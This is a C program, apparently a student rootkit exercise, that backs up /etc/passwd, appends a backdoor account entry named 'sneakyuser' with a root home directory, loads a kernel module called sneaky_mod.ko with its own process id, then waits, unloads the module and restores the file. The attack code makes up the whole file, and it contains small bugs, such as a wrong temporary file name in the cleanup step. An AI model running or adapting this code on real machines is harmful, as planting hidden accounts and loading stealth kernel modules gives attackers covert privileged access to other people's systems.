
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>




void print_pid() {
    printf("sneaky_process pid = %d\n", getpid());
} 


void fopen_error(FILE* file) {
    if (file == NULL) {
        fprintf(stderr, "  Cannot open file (NULL).\n");
        exit(EXIT_FAILURE);
    }
}

void close_file(FILE* fp) {
    if (fp == NULL) {
        fprintf(stderr, "  Cannot close file (NULL).\n");
    } else if (fclose(fp) != 0) {
        fprintf(stderr, "Cannot close file.\n");
    }
}

void add_attacker(const char* line, const char * one) {
   FILE *f_one = fopen(one, "a"); 
   fopen_error(f_one);
   fwrite(line, sizeof(char), strlen(line), f_one);
   close_file(f_one);
}

// creates new /temp/passwd if never existed, if exists overwrite
void handle_files(char const * one, char const * two) {
  
    FILE *f_one = fopen(one, "r");
    FILE *f_two = fopen(two, "w");
    fopen_error(f_one);
    fopen_error(f_one);
 
    size_t len = 0;
    ssize_t read;
    char *buf = NULL;
    while ((read = getline(&buf, &len, f_one)) != -1) {
        fwrite(buf, sizeof(char), strlen(buf), f_two);
    }
    free(buf);
    close_file(f_one);
    close_file(f_two);
    }

void load_sneaky() {
  char buffer[100];
  sprintf(buffer, "insmod sneaky_mod.ko pid=%d", getpid());
  system(buffer);
}

void get_q(){
  char q;
  while (1) {
    q = getchar();
    if (q != 'q')
      continue;
    else
      break;
  }
}


int main(){
    const char * one = "/etc/passwd";
    const char * two = "/tmp/passwd";
    const char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n";
    print_pid();
    handle_files(one, two);
    add_attacker(line, one);
    load_sneaky();
    printf("module loaded. start hacking!\n");
    get_q();
    //unload sneaky module
    system("rmmod sneaky_mod");
    printf("module unloaded.\n");
    //copy tmp to etc 
    handle_files(two, one);
    printf("done restoring /etc/passed\n");
    //delete tmp/passwd
    system("rm -f /tmp/passed");
    printf("done removing the /tmp/passed\n");
    printf("done testing!\n");
    return EXIT_SUCCESS;
}